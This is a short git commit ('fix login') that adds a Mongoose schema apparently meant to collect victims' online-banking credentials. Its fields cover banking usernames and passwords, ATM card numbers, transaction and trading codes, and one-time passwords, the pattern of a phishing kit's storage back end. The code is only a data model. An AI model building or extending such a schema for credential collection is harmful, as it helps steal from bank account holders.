61004a302b7caebfd8767e41a4c23ee7a415af78
Phong <phongit1995@gmail.com>
2019-07-31 23:19:11 +0700

    fix login

---
+++ models/InFo.js
@@ -0,0 +1,21 @@
+var mongoose = require("mongoose");
+var Schema = mongoose.Schema;
+var InFo = new Schema({
+    phonenumber: Number,
+    passwowrd:String,
+    Internationaltransactioncode:Number,
+    Bank:String,
+    NumberATM:String,
+    NameAcount:String,
+    releasedate:Date,
+    UserBanking:String,
+    PasswordBanking:String,
+    Tradingcode:String,
+    OTP:String,
+    Createat:{
+        type:Date,
+        default:Date.now,
+        timezone: 'Asia/Jakarta'
+    }
+})
+module.exports = mongoose.model("InFo",InFo);
